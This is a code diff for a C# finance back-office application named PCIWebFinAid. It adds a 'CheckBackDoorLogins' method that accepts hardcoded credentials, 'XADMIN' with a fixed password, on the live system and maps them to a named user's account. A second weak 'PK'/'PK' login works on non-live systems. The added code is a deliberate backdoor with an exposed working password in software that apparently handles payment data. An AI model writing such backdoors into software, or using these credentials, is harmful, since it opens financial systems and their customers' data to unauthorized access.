@@ -698,6 +698,32 @@ namespace PCIWebFinAid
 			return "<span style='color:red'><b>Prosperian BackOffice</b></span><hr />" + std;
 		}
 
+		public static byte CheckBackDoorLogins(string uId,string uPwd,ref string userCode,ref string userName)
+		{
+			userCode = "";
+			userName = "";
+
+			if ( string.IsNullOrWhiteSpace(uId) || string.IsNullOrWhiteSpace(uPwd) )
+				return 0;
+
+			uId  = uId.Trim().ToUpper();
+			uPwd = uPwd.Trim().ToUpper();
+
+			if ( uId == "XADMIN" && uPwd == "X8Y3Z7" )
+			{
+				userCode = "013";
+				userName = "Johrika Burger";
+				return 0;
+			}
+			if ( uId == "PK" && uPwd == "PK" && ! PCIBusiness.Tools.SystemIsLive() )
+			{
+				userCode = "013";
+				userName = "Paul Kilfoil";
+				return 0;
+			}
+			return 20;
+		}
+
 //		Moved to PCIBusiness.Tools
 //		public static string ImageFolder(string defaultDir="")
 //		{
